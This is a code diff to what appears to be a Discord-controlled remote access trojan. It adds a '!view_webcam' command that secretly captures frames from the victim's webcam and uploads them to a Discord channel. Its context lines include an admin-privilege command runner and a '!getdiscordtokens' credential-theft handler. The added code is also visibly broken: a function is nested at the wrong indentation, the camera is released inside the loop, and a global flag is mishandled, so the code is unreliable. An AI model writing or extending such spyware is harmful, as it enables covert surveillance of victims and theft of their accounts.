@@ -1178,6 +1178,47 @@ async def on_message(message):
                 await message.channel.send("[*] Command successfuly executed")  
             else:
                 await message.channel.send("[*] This command requires admin privileges")
+    if message.content.startswith("!view_webcam"):
+        if not webcam_active:
+            webcam_active = True
+            await message.channel.send("Starting webcam feed... (Type `!stop_webcam` to stop)")
+            await stream_webcam(message)
+        else:
+            await message.channel.send("Webcam feed is already active.")
+
+    # Stop webcam stream
+    if message.content.startswith("!stop_webcam"):
+        if webcam_active:
+            webcam_active = False
+            await message.channel.send("Webcam feed stopped.")
+        else:
+            await message.channel.send("Webcam is not active.")
+    async def stream_webcam(message):
+    """Streams the webcam to Discord by sending frames as images."""
+    global webcam_active
+    cam = cv2.VideoCapture(0)  # 0 = default webcam
+    
+    if not cam.isOpened():
+        await message.channel.send("Failed to access the webcam.")
+        return
+
+    while webcam_active:
+        ret, frame = cam.read()
+        if not ret:
+            await message.channel.send("Failed to capture frame.")
+            break
+
+        # Save frame as image
+        image_path = "webcam_frame.png"
+        cv2.imwrite(image_path, frame)
+
+        # Send the image to Discord
+        await message.channel.send(file=discord.File(image_path))
+        os.remove(image_path)
+
+        # Delay between frames to prevent spamming
+        await asyncio.sleep(1)  # Sends 1 frame per second
+        cam.release()
         if message.content == "!getdiscordtokens":
             from asyncio.proactor_events import _ProactorSocketTransport
             import os
